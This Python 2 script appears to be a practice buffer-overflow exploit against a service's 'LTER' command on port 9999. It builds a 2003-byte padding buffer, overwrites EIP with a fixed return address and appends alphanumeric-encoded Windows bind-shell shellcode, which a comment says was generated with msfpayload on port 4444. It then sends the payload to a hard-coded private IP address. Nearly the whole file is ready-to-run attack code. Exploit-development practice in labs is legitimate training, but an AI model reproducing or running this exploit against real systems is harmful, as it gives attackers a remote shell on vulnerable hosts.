import socket as so
import struct, os

os.system('clear')

#msfpayload windows/shell_bind_tcp lport=4444 R |msfencode -e x86/alpha_mixed -t python -b '\x00\x0a\x0b' BufferRegister=ESP
shellcode = "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
shellcode += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
shellcode += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x49\x6c\x39\x78\x4f\x72\x53\x30\x73\x30\x65\x50\x43"
shellcode += "\x50\x4e\x69\x39\x75\x30\x31\x6b\x70\x51\x74\x6c\x4b"
shellcode += "\x36\x30\x34\x70\x4e\x6b\x50\x52\x56\x6c\x6e\x6b\x71"
shellcode += "\x42\x57\x64\x4c\x4b\x72\x52\x56\x48\x66\x6f\x68\x37"
shellcode += "\x73\x7a\x54\x66\x45\x61\x59\x6f\x6c\x6c\x57\x4c\x70"
shellcode += "\x61\x73\x4c\x56\x62\x74\x6c\x55\x70\x7a\x61\x58\x4f"
shellcode += "\x66\x6d\x76\x61\x6f\x37\x79\x72\x6b\x42\x73\x62\x43"
shellcode += "\x67\x4c\x4b\x61\x42\x46\x70\x4e\x6b\x72\x6a\x35\x6c"
shellcode += "\x4e\x6b\x30\x4c\x32\x31\x61\x68\x68\x63\x70\x48\x55"
shellcode += "\x51\x68\x51\x32\x71\x6c\x4b\x32\x79\x75\x70\x73\x31"
shellcode += "\x6e\x33\x6c\x4b\x71\x59\x46\x78\x59\x73\x35\x6a\x32"
shellcode += "\x69\x4e\x6b\x47\x44\x4c\x4b\x66\x61\x38\x56\x30\x31"
shellcode += "\x6b\x4f\x6e\x4c\x5a\x61\x48\x4f\x36\x6d\x75\x51\x78"
shellcode += "\x47\x57\x48\x4d\x30\x31\x65\x79\x66\x66\x63\x33\x4d"
shellcode += "\x5a\x58\x35\x6b\x43\x4d\x65\x74\x70\x75\x39\x74\x42"
shellcode += "\x78\x4e\x6b\x30\x58\x67\x54\x65\x51\x79\x43\x63\x56"
shellcode += "\x6c\x4b\x64\x4c\x30\x4b\x6e\x6b\x51\x48\x45\x4c\x37"
shellcode += "\x71\x6b\x63\x4c\x4b\x65\x54\x4e\x6b\x53\x31\x4e\x30"
shellcode += "\x6f\x79\x50\x44\x56\x44\x54\x64\x51\x4b\x63\x6b\x50"
shellcode += "\x61\x62\x79\x33\x6a\x46\x31\x69\x6f\x6d\x30\x63\x6f"
shellcode += "\x43\x6f\x51\x4a\x4e\x6b\x64\x52\x7a\x4b\x6e\x6d\x71"
shellcode += "\x4d\x33\x58\x36\x53\x56\x52\x53\x30\x43\x30\x52\x48"
shellcode += "\x43\x47\x31\x63\x54\x72\x51\x4f\x43\x64\x53\x58\x42"
shellcode += "\x6c\x52\x57\x45\x76\x33\x37\x49\x6f\x4a\x75\x4c\x78"
shellcode += "\x6c\x50\x37\x71\x65\x50\x35\x50\x36\x49\x59\x54\x70"
shellcode += "\x54\x50\x50\x53\x58\x77\x59\x4d\x50\x62\x4b\x73\x30"
shellcode += "\x49\x6f\x4a\x75\x73\x5a\x56\x68\x66\x39\x76\x30\x48"
shellcode += "\x62\x4b\x4d\x63\x70\x76\x30\x51\x50\x56\x30\x63\x58"
shellcode += "\x58\x6a\x74\x4f\x39\x4f\x49\x70\x79\x6f\x4e\x35\x6d"
shellcode += "\x47\x55\x38\x53\x32\x45\x50\x36\x71\x61\x4c\x6f\x79"
shellcode += "\x59\x76\x72\x4a\x42\x30\x53\x66\x72\x77\x53\x58\x79"
shellcode += "\x52\x79\x4b\x35\x67\x51\x77\x49\x6f\x68\x55\x36\x37"
shellcode += "\x65\x38\x4e\x57\x59\x79\x74\x78\x79\x6f\x59\x6f\x59"
shellcode += "\x45\x30\x57\x63\x58\x72\x54\x48\x6c\x67\x4b\x6b\x51"
shellcode += "\x69\x6f\x38\x55\x76\x37\x6f\x67\x43\x58\x43\x45\x62"
shellcode += "\x4e\x42\x6d\x63\x51\x6b\x4f\x39\x45\x65\x38\x70\x63"
shellcode += "\x62\x4d\x63\x54\x67\x70\x4d\x59\x79\x73\x42\x77\x53"
shellcode += "\x67\x76\x37\x45\x61\x4b\x46\x61\x7a\x45\x42\x56\x39"
shellcode += "\x71\x46\x59\x72\x39\x6d\x35\x36\x4a\x67\x52\x64\x65"
shellcode += "\x74\x47\x4c\x73\x31\x76\x61\x4e\x6d\x51\x54\x51\x34"
shellcode += "\x34\x50\x5a\x66\x57\x70\x73\x74\x56\x34\x46\x30\x46"
shellcode += "\x36\x70\x56\x62\x76\x47\x36\x32\x76\x32\x6e\x53\x66"
shellcode += "\x62\x76\x76\x33\x66\x36\x52\x48\x44\x39\x38\x4c\x35"
shellcode += "\x6f\x6d\x56\x79\x6f\x4a\x75\x4f\x79\x59\x70\x70\x4e"
shellcode += "\x63\x66\x31\x56\x39\x6f\x46\x50\x52\x48\x36\x68\x6c"
shellcode += "\x47\x37\x6d\x51\x70\x49\x6f\x78\x55\x6d\x6b\x38\x70"
shellcode += "\x6d\x65\x4d\x72\x33\x66\x72\x48\x49\x36\x6d\x45\x4f"
shellcode += "\x4d\x6f\x6d\x6b\x4f\x49\x45\x55\x6c\x77\x76\x43\x4c"
shellcode += "\x46\x6a\x4f\x70\x69\x6b\x39\x70\x42\x55\x57\x75\x6f"
shellcode += "\x4b\x61\x57\x47\x63\x34\x32\x62\x4f\x63\x5a\x67\x70"
shellcode += "\x42\x73\x4b\x4f\x4a\x75\x41\x41"

buffer = "A"*2003
eip = struct.pack("<L",0x62501205)
payload = buffer+eip+shellcode

print "\nSend Exploit LTER...\n"
s=so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect(("192.168.0.103", 9999))
s.send("LTER /.:/"+payload+"\r\n")
s.recv(1024)
s.close()
